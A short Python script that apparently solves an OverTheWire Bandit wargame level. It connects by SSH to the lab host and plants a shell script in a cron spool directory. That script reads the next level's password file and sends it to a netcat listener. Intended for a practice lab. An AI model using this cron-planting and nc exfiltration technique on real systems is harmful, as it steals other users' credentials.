import paramiko
import paramiko.client
from sys import argv
from tqdm import tqdm
from time import sleep

next_level = argv[0].split('/')[-1].split('\\')[-1][:-3]

username = f"bandit{int(next_level[6:]) - 1}"

with open(f"./passwords/{username}.pass", 'r') as f:
    password = f.read()

client = paramiko.client.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

client.connect(
    hostname="bandit.labs.overthewire.org",
    port=2220,
    username=username,
    password=password
)

_stdin, _stdout, _stderr = client.exec_command('nc -l 64729 & echo -e "#/bin/sh\nnc localhost 64729 < /etc/bandit_pass/bandit24" > /var/spool/bandit24/foo/bandit23.sh && chmod o+x /var/spool/bandit24/foo/bandit23.sh')

print("Waiting...")

new_password = _stdout.read().decode().replace('\n', '')

print(new_password)

client.close()

with open(f"./passwords/{next_level}.pass", 'w') as f:
    f.write(new_password)
